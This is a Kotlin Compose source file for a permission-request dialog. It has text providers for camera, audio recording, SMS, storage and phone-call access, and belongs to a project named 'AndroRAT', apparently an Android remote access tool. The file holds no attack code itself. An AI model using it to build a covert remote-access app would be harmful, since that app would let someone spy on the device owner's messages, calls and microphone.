package com.ierusalem.androrat.ui.components

import android.content.Context
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Divider
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import com.ierusalem.androrat.R
import com.ierusalem.androrat.ui.theme.AndroRATTheme

@Composable
fun PermissionDialog(
    permissionTextProvider: PermissionTextProvider,
    isPermanentlyDeclined: Boolean,
    onDismiss: () -> Unit,
    onOkClick: () -> Unit,
    onGoToAppSettingsClick: () -> Unit,
    modifier: Modifier = Modifier
) {
    val context = LocalContext.current
    AlertDialog(
        onDismissRequest = onDismiss,
        confirmButton = {
            Column(
                modifier = Modifier.fillMaxWidth(),
                content = {
                    Divider()
                    Text(
                        text = if (isPermanentlyDeclined) {
                            stringResource(R.string.grant_permission)
                        } else {
                            stringResource(R.string.ok)
                        },
                        fontWeight = FontWeight.Bold,
                        textAlign = TextAlign.Center,
                        modifier = Modifier
                            .fillMaxWidth()
                            .clickable {
                                if (isPermanentlyDeclined) {
                                    onGoToAppSettingsClick()
                                } else {
                                    onOkClick()
                                }
                            }
                            .padding(16.dp)
                    )
                }
            )
        },
        title = {
            Text(text = stringResource(R.string.permission_required))
        },
        text = {
            Text(
                text = permissionTextProvider.getDescription(
                    context = context,
                    isPermanentlyDeclined = isPermanentlyDeclined
                )
            )
        },
        modifier = modifier
    )
}

interface PermissionTextProvider {
    fun getDescription(context: Context, isPermanentlyDeclined: Boolean): String
}

class MusicAndAudioPermissionTextProvider : PermissionTextProvider {
    override fun getDescription(context: Context, isPermanentlyDeclined: Boolean): String {
        return if (isPermanentlyDeclined) {
            context.getString(R.string.music_denied)
        } else {
            context.getString(R.string.music_and_audio_permission_request)
        }
    }
}

class PhotosAndVideosPermissionTextProvider : PermissionTextProvider {
    override fun getDescription(context: Context, isPermanentlyDeclined: Boolean): String {
        return if (isPermanentlyDeclined) {
            context.getString(R.string.media_denied)
        } else {
            context.getString(R.string.media_permission_request)
        }
    }
}

class CameraPermissionTextProvider : PermissionTextProvider {
    override fun getDescription(context: Context, isPermanentlyDeclined: Boolean): String {
        return if (isPermanentlyDeclined) {
            context.getString(R.string.camera_denied)
        } else {
            context.getString(R.string.camera_permission_request)
        }
    }
}

class ReadSMSMessageTextProvider: PermissionTextProvider{
    override fun getDescription(context: Context, isPermanentlyDeclined: Boolean): String {
        return if (isPermanentlyDeclined) {
            context.getString(R.string.sms_denied)
        } else {
            context.getString(R.string.sms_request_permission)
        }
    }
}

class ReadExternalStoragePermissionTextProvider : PermissionTextProvider {
    override fun getDescription(context: Context, isPermanentlyDeclined: Boolean): String {
        return if (isPermanentlyDeclined) {
            context.getString(R.string.read_storage_denied)
        } else {
            context.getString(R.string.read_storage_permission_request)
        }
    }
}

class RecordAudioPermissionTextProvider : PermissionTextProvider {
    override fun getDescription(context: Context, isPermanentlyDeclined: Boolean): String {
        return if (isPermanentlyDeclined) {
            context.getString(R.string.record_audio_denied)
        } else {
            context.getString(R.string.record_audio_permission_request)
        }
    }
}

class PhoneCallPermissionTextProvider : PermissionTextProvider {
    override fun getDescription(context: Context, isPermanentlyDeclined: Boolean): String {
        return if (isPermanentlyDeclined) {
            context.getString(R.string.phone_call_denied)
        } else {
            context.getString(R.string.phone_call_permission_request)
        }
    }
}

@Preview
@Composable
fun PermissionDialog_Preview(){
    PermissionDialog(
        permissionTextProvider = PhoneCallPermissionTextProvider(),
        isPermanentlyDeclined = false,
        onDismiss = { /*TODO*/ },
        onOkClick = { /*TODO*/ },
        onGoToAppSettingsClick = { /*TODO*/ }
    )
}
@Preview
@Composable
fun PermissionDialog_Preview_Dark(){
    AndroRATTheme(darkTheme = true) {
        PermissionDialog(
            permissionTextProvider = PhoneCallPermissionTextProvider(),
            isPermanentlyDeclined = true,
            onDismiss = { /*TODO*/ },
            onOkClick = { /*TODO*/ },
            onGoToAppSettingsClick = { /*TODO*/ }
        )
    }
}